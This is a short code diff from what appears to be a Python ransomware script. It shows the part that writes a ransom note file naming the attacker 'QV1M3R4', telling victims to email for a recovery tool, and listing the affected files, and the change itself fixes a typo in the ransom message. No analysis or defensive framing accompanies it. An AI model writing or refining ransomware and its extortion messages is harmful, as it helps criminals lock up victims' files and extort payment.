@@ -72,7 +72,7 @@ for dirpath, dirs, files in os.walk(os.getcwd()):
 # ========================================================================= #
 with open("egg_{0}.txt".format(node_sig), "w") as fl:
     fl.write("You have been pwned by QV1M3R4.\n")
-    fl.write("Send a messa to our@email.com to get your recovery tool.\n\n")
+    fl.write("Send a message to our@email.com to get your recovery tool.\n\n")
     fl.write("Node Signature: {0}\n".format(node_sig))
     fl.write("{0} File(s) affected:\n\n".format(len(tool.files_found)))
     for file in tool.files_found:
